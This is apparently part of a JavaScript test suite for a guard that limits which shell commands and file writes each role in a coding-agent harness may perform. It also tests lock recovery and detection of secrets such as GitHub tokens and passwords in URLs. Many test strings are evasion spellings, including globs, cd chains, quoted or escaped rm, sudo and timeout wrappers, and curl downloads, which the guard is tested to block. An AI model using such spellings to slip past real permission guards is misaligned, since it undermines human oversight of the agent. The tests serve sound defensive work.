    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: shell writes to protected paths are caught through cd, globs and quoting", () => {
  const root = tmp("protglob");
  try {
    mkdirSync(join(root, "config"), { recursive: true });
    mkdirSync(join(root, "src", "auth"), { recursive: true });
    writeFileSync(join(root, "config", "db.yml"), "x\n");
    const m = { protected_paths: ["config/", "src/auth/**"], context_files: [] };
    const rule = (cmd, extra = {}) => decide({ role: "implementer", toolName: "bash", input: { command: cmd }, cwd: root, root, manifest: m, ...extra })?.rule ?? null;
    for (const cmd of ["rm c*/db.yml", "rm conf?g/x", "rm [c]onfig/db.yml", "cd src && rm auth/login.ts", "cd src/auth && echo x > login.ts", 'rm "config/db.yml"', "rm ./src/../config/db.yml"]) {
      assert.equal(rule(cmd), "protected-path", cmd);
    }
    // Inside a worktree, protected paths are relative to the worktree.
    const wt = join(root, ".worktrees", "issue-4");
    mkdirSync(join(wt, "config"), { recursive: true });
    assert.equal(rule("rm c*/x.yml", { cwd: wt, worktree: wt }), "protected-path");
    assert.equal(rule("rm src/app.ts"), null);
    assert.equal(rule("rm c*/db.yml", { allowProtected: true }), null, "the human override still works");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: read-only roles can't write through option spellings, wrappers or quoting", () => {
  const root = tmp("ro2");
  try {
    for (const cmd of [
      "sed -i.bak s/a/b/ f",
      "sed --in-place=.orig s/a/b/ f",
      "perl -p -i -e s/a/b/ f",
      "perl -pi.bak -e s/a/b/ f",
      "cmd &>file",
      "cmd &>>file",
      "find . -delete",
      "find . -name '*.tmp' -exec rm {} +",
      "find . -exec rm {} \\;",
      "git branch -D x",
      "git branch --delete x",
      "git pull",
      "git clone https://x/y",
      "npx prettier -w .",
      "npx prettier --write .",
      "python3 -m black .",
      "python -m pip install x",
      "curl -sSo f https://x",
      "curl -sSLO https://x/f",
      "curl -s -c jar https://x",
      "wget -qO f https://x",
      "gh api repos/x/y/issues -f title=x",
      "gh api repos/x/y/issues -F title=x",
      "gh api repos/x/y/issues --field title=x",
      "gh api graphql --input q.json",
      "nice -n 5 rm f",
      "timeout 5 rm f",
      "timeout -s KILL 5s rm f",
      "env X=1 rm f",
      "sudo -u root rm f",
      "ls | xargs rm",
      "ls | xargs -n 1 rm",
      '"rm" f',
      "'rm' f",
      "\\rm f",
      'r"m" f',
      'echo x >"out.txt"',
    ]) {
      assert.match(call(root, "reviewer", "bash", { command: cmd })?.rule ?? "allowed", /^(read-only-role|qa-no-autofix)$/, cmd);
    }
    for (const cmd of [
      "git fetch origin",
      "git config --get user.email",
      "git branch -a",
      "git branch --list 'agent/*'",
      "curl -s https://x | head",
      "curl -X POST -s https://x/api",
      "curl --compressed -s https://x",
      "wget -qO- https://x",
      "wget -q -O - https://x",
      "gh api repos/x/y/pulls",
      "gh api -X GET search/issues -f q=x",
      "find . -name '*.ts' -exec grep -l TODO {} +",
      "find . -type f",
      "sed -n 1,5p f",
      "sed -e s/a/b/ f",
      "nice -n 5 npm test",
      "timeout 60 npm test",
      "grep -rn 'a > b' src",
      "python3 -m pytest -q",
    ]) {
      const r = call(root, "reviewer", "bash", { command: cmd });
      assert.equal(r, null, `${cmd} → ${r?.reason}`);
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("withLock: breaking a dead holder's lock never lets two processes in", async () => {
  const dir = tmp("lock");
  try {
    const lock = join(dir, "state.lock");
    const counter = join(dir, "n");
    const worker = join(dir, "worker.mjs");
    const fsutil = pathToFileURL(fileURLToPath(new URL("../extensions/lib/fsutil.js", import.meta.url))).href;
    writeFileSync(
      worker,
      `import { withLock } from ${JSON.stringify(fsutil)};
import { readFileSync, writeFileSync } from "node:fs";
const [lock, counter, startAt, iters] = process.argv.slice(2);
while (Date.now() < Number(startAt)) {}
for (let i = 0; i < Number(iters); i++) {
  withLock(lock, () => {
    const n = Number(readFileSync(counter, "utf-8"));
    for (const t = Date.now(); Date.now() - t < 2; ) {}
    writeFileSync(counter, String(n + 1));
  });
}
`,
    );
    const deadPid = spawnSync(process.execPath, ["-e", ""]).pid;
    const workers = 12;
    const iters = 3;
    // Both lock formats: current (pid@host) and a pre-upgrade bare PID.
    for (const seed of [`${deadPid}@${hostname()}`, String(deadPid), `${deadPid}@${hostname()}`]) {
      writeFileSync(counter, "0");
      writeFileSync(lock, seed);
      const startAt = Date.now() + 500;
      await Promise.all(
        Array.from(
          { length: workers },
          () =>
            new Promise((res, rej) => {
              const c = spawn(process.execPath, [worker, lock, counter, String(startAt), String(iters)], { stdio: ["ignore", "ignore", "pipe"] });
              let err = "";
              c.stderr.on("data", (d) => (err += d));
              c.on("exit", (code) => (code === 0 ? res() : rej(new Error(err))));
            }),
        ),
      );
      assert.equal(readFileSync(counter, "utf-8"), String(workers * iters), "every increment survives");
    }
    // A lock held by a PID on another host is never judged by PID — only by age.
    writeFileSync(lock, `${deadPid}@some-other-host.invalid`);
    assert.throws(() => withLock(lock, () => {}, 200), /timed out/);
  } finally {
    rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
  }
});

test("manifest: protected_paths given as a string is one pattern, never a crash or a char-by-char match", () => {
  const root = tmp("strprot");
  try {
    writeFileSync(join(root, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: "config/", context_files: [] }));
    const loaded = loadManifest(root);
    assert.ok(loaded.ok);
    assert.deepEqual(loaded.value.manifest.protected_paths, ["config/"]);
    assert.ok(loaded.value.problems.some((p) => /protected_paths must be an array/.test(p)), "reported as a warning");
    writeFileSync(join(root, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: ["config/", 7, null, ""], context_files: [] }));
    assert.deepEqual(loadManifest(root).value.manifest.protected_paths, ["config/"]);

    // The guard is handed raw manifests too; none of these may throw.
    for (const pp of ["config/", 42, { a: 1 }, null, ["config/", 3]]) {
      const m = { protected_paths: pp, context_files: "nope", default_branch: 5 };
      for (const [tool, input] of [["write", { path: "config/x.yml" }], ["bash", { command: "rm config/x.yml" }], ["bash", { command: "git push origin main" }]]) {
        assert.doesNotThrow(() => decide({ role: "implementer", toolName: tool, input, cwd: root, root, manifest: m }), `${JSON.stringify(pp)} ${tool}`);
      }
    }
    assert.equal(decide({ role: null, toolName: "write", input: { path: "config/x.yml" }, cwd: root, root, manifest: { protected_paths: "config/" } })?.rule, "protected-path");
    assert.equal(matchAny("config/", "c"), null, "a string isn't iterated char by char");
    assert.equal(matchAny("config/", "config/a"), "config/");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("check-staged: non-ASCII file names are checked, not silently skipped as C-quoted strings", () => {
  const { dir, g } = gitRepo("unicode");
  try {
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: ["config/"], context_files: [] }));
    g("add", "-A");
    g("commit", "-qm", "init");
    mkdirSync(join(dir, "config", "prod"), { recursive: true });
    writeFileSync(join(dir, "config", "prod", "naïve.yml"), "a: 1\n");
    g("add", "-A");
    let r = run(dir, ["check-staged"]);
    assert.equal(r.status, 1, r.stdout);
    assert.match(r.stdout, /protected path staged: config\/prod\/naïve\.yml/);
    g("reset", "-q");
    rmSync(join(dir, "config"), { recursive: true, force: true });

    writeFileSync(join(dir, "notes é.txt"), `token: ghp_${"a".repeat(36)}\n`);
    g("add", "-A");
    r = run(dir, ["check-staged"]);
    assert.equal(r.status, 1, r.stdout);
    assert.match(r.stdout, /possible GitHub token in notes é\.txt/);
    assert.doesNotMatch(r.stdout, /ghp_a/, "the value is never printed");
    g("reset", "-q");
    rmSync(join(dir, "notes é.txt"));

    writeFileSync(join(dir, "日本.md"), "x\n");
    assert.ok(changedFiles(dir, "HEAD").includes("日本.md"), "untracked names come back verbatim");
    g("add", "-A");
    assert.deepEqual(stagedFiles(dir), ["日本.md"]);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("secret detection: env-file variants, more token shapes, long lines and per-match placeholders", () => {
  for (const f of [".env", ".env.production", ".env.production.local", ".env.development.local", "app/.env.local", ".envrc", "prod.env", "deploy/staging.env"]) {
    assert.ok(isEnvFile(f), `${f} is an env file`);
  }
  for (const f of [".env.example", ".env.sample", ".env.template", ".env.local.example", "prod.env.example", "x.env.sample", "src/env.ts", ".venv", "environment.yml"]) {
    assert.ok(!isEnvFile(f), `${f} is not`);
  }
  const kinds = (s) => findSecrets(s).map((x) => x.kind);
  const cases = [
    ["Azure storage account key", `DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=${"Ab1+".repeat(21)}Ab==;EndpointSuffix=core.windows.net`],
    ["URL with embedded password", "https://deploy:hunter2hunter2@example.com/repo.git"],
    ["URL with embedded password", "ftp://backup:Sup3rS3cret@files.example.com/"],
    ["database URL with password", "mongodb+srv://app:pa/ss9word@cluster0.example.net/db"],
    ["database URL with password", "redis://default:r3d1sP4ss@cache:6379"],
    ["database URL with password", "amqp://svc:qu3u3P4ss@mq/vhost"],
    ["DigitalOcean token", `dop_v1_${"a1".repeat(32)}`],
    ["Shopify token", `shpat_${"a1".repeat(16)}`],
    ["npm auth token", `//registry.npmjs.org/:_authToken=${["0123abcd", "1234", "5678", "9abc", "0123456789ab"].join("-")}`],
    ["npm auth token", `//registry.npmjs.org/:_authToken=npm_${"A".repeat(36)}`],
    ["GitHub token", `${"x".repeat(30_000)} ghp_${"a".repeat(36)}`],
    ["GitHub token", `${"y".repeat(4094)} ghp_${"b".repeat(36)} ${"y".repeat(9000)}`],
    ["database URL with password", "a=postgres://u:password@h/x b=postgres://app:s3cr3tP4ss@db/x"],
  ];
  cases.forEach(([kind, s], i) => assert.ok(kinds(s).includes(kind), `missed ${kind} (case ${i})`));
  for (const ok of [
    "//registry.npmjs.org/:_authToken=${NPM_TOKEN}",
    "https://user:password@example.com",
    "http://localhost:3000/@fs/src/app.ts",
    "https://example.com:8443/path/@scope/pkg",
    "git clone https://github.com/x/y.git",
    `AccountKey=${"A".repeat(20)}==`,
    "postgres://u:password@h/x and postgres://u:${PW}@h/y",
  ]) {
    assert.deepEqual(kinds(ok), [], `false positive: ${ok.slice(0, 40)}`);
  }
  // Bounded cost: a pathological megabyte line is scanned, not skipped, and fast.
  for (const [name, line] of [
    ["jwt-ish", "-eyJ".repeat(250_000)],
    ["url-ish", "postgres://a:".repeat(80_000)],
    ["base64", "QUJD".repeat(250_000)],
  ]) {
    const t0 = Date.now();
    findSecrets(line);
    assert.ok(Date.now() - t0 < 1000, `${name}: 1 MB line took ${Date.now() - t0}ms`);
  }
});

test("protected directory names only match as path segments: `git config` and `myconfig/` are not `config/`", () => {
  const manifest = { version: "2", context_files: [], protected_paths: ["config/", "src/auth/**", "*.env"] };
  const at = (command, role = "implementer") =>
    decide({ role, toolName: "bash", input: { command }, cwd: process.cwd(), root: process.cwd(), manifest, worktree: role === "implementer" ? process.cwd() : undefined })?.rule ?? "allowed";
  for (const c of ["git config user.name ci", "git -c color.ui=never config --get user.email", "echo x > myconfig/a", "mv a reconfig.txt"]) {
    assert.equal(at(c), "allowed", c);
    assert.equal(at(c, null), "allowed", `${c} (no role)`);
  }
  for (const c of ["rm config/db.yml", "rm -rf config", "git rm config/a.yml", "git checkout -- config/a.yml", "cat x | tee config/y", "rm production.env", "cd src && rm auth/login.ts"]) {
    assert.equal(at(c), "protected-path", c);
  }
});

test("QA sweep: ordinary commands pass for every role that should run them; real writes to protected paths still block", () => {
  const root = mkdtempSync(join(tmpdir(), "af-fp-"));
  const wt = join(root, ".worktrees", "issue-1");
  mkdirSync(wt, { recursive: true });
  try {
    const m = { version: "2", context_files: [{ path: "AGENTS.md", references: [] }], protected_paths: ["config/", "migrations/**", "package-lock.json", "*.env"] };
    const at = (c, role) =>
      decide({ role, toolName: "bash", input: { command: c }, cwd: role === "implementer" ? wt : root, root, manifest: m, worktree: role === "implementer" ? wt : undefined })?.rule ?? "ok";
    const pass = [
      [null, 'git commit -m "fix: load config/ lazily"'], [null, 'git commit -m "bump package-lock.json"'], [null, 'git commit -am "chore: rm unused migrations/ helper"'],
      [null, 'grep -rn "config/" src > hits.txt'], [null, "ls migrations/ > list.txt"], [null, 'echo "see config/ dir" > notes.txt'],
      [null, 'cat <<EOF > src/x.ts\nconst p = "config/";\nEOF'], ["implementer", 'git add src && git commit -m "docs: mention AGENTS.md"'],
      ["implementer", 'git commit -m "refactor .github/workflows reference"'], [null, "mkdir -p src/config"], ["implementer", "mkdir -p src/config"],
      ["reviewer", "git stash list"], ["reviewer", "git tag -l"], ["reviewer", "git notes show"], ["reviewer", "git config user.email"],
      ["reviewer", "tee /dev/null"], ["reviewer", "echo x | tee /dev/null"], ["reviewer", 'curl -sSo /dev/null -w "%{http_code}" https://x.dev'],
      ["qa", 'echo "--fix is bad"'], ["qa", "grep -- --write README.md"], ["qa", "git config --get user.email"],
      ["implementer", "npm test 2>&1 | tee test.log"], [null, "git log --oneline -- config/ > log.txt"],
    ];
    const block = [
      [null, "rm config/db.yml"], [null, "git rm -r migrations/0001.sql"], [null, "echo x > config/a.yml"], [null, "sed -i s/a/b/ config/app.yml"],
      [null, 'python3 - <<EOF\nopen("config/db.yml","w").write("x")\nEOF'], ["reviewer", "git stash"], ["reviewer", "git tag v1"],
      ["reviewer", "git config user.email x@y"], ["reviewer", "tee out.txt"], ["reviewer", "curl -sSo out.bin https://x.dev"], ["qa", "npx eslint --fix ."],
      ["qa", "jest -u"], [null, "rm production.env"], ["implementer", 'perl -pi -e "s/a/b/" config/x.yml'], [null, "cp a ./config/b"], [null, "rm c*/db.yml"],
      [null, "F=config/x; rm $F"], [null, "git checkout -- config/a.yml"], [null, "npx prettier --write config/"],
    ];
    for (const [r, c] of pass) assert.equal(at(c, r), "ok", `${r} ${c}`);
    for (const [r, c] of block) assert.notEqual(at(c, r), "ok", `${r} ${c}`);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("an existing but unparseable manifest fails closed for writes (and still lets you fix the manifest)", () => {
  const g = (toolName, input, role = null) =>
    decide({ role, toolName, input, cwd: process.cwd(), root: process.cwd(), manifest: null, manifestError: "invalid JSON" })?.rule ?? "ok";
  assert.equal(g("write", { path: "config/a.yml" }), "manifest-unreadable");
  assert.equal(g("bash", { command: "echo x > config/a.yml" }), "manifest-unreadable");
  assert.equal(g("bash", { command: "git rm config/a.yml" }, "implementer"), "manifest-unreadable");
  assert.equal(g("edit", { path: "CONTEXT_MANIFEST.json" }), "ok");
  assert.equal(g("bash", { command: "cat CONTEXT_MANIFEST.json" }), "ok");
  assert.equal(g("read", { path: "config/a.yml" }), "ok");
});

test("an empty lock left by a crash (killed before writing its PID) is recovered in about a second, not by timing out", async () => {
  const { withLock } = await import("../extensions/lib/fsutil.js");
  const { utimesSync } = await import("node:fs");
  const dir = mkdtempSync(join(tmpdir(), "af-emptylock-"));
  try {
    const lock = join(dir, "state.lock");
    writeFileSync(lock, "");
    const old = new Date(Date.now() - 2_000);
    utimesSync(lock, old, old);
    const t = Date.now();
    assert.equal(withLock(lock, () => "ok", 3_000), "ok");
    assert.ok(Date.now() - t < 1_000);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("prose drift ignores prose (and/or, TCP/IP), build output and deps; understands unicode paths", async () => {
  const { extractProseRefs } = await import("../extensions/lib/stale.js");
  const refs = extractProseRefs("Use `and/or`, `TCP/IP`, `client/server`, `a/b`. Built to `dist/index.js` via `node_modules/.bin/tsc`. See `src/ünï/missing.ts` and `src/utils/` and `docs/guide.md`.").map((r) => r.path);
  assert.deepEqual(refs.sort(), ["docs/guide.md", "src/utils/", "src/ünï/missing.ts"].sort());
  // Adjective use names a kind of thing, not a file (seen in a real AGENTS.md).
  assert.deepEqual(extractProseRefs("`old/.env`-style accidents must stay impossible; `lib/x.ts`-like modules too.").map((r) => r.path), []);
});

test("manifest type errors are named, not reported as 'missing'", () => {
  const p = validateManifestForTest({ version: 2, default_branch: 5, context_files: ["AGENTS.md", { path: 5, references: [] }] });
  assert.ok(p.some((x) => /version must be a string/.test(x)));
  assert.ok(p.some((x) => /default_branch must be a branch name string/.test(x)));
  assert.ok(p.some((x) => /context_files\[0\] must be an object/.test(x)));
  assert.ok(p.some((x) => /context_files\[1\]\.path must be a string/.test(x)));
});
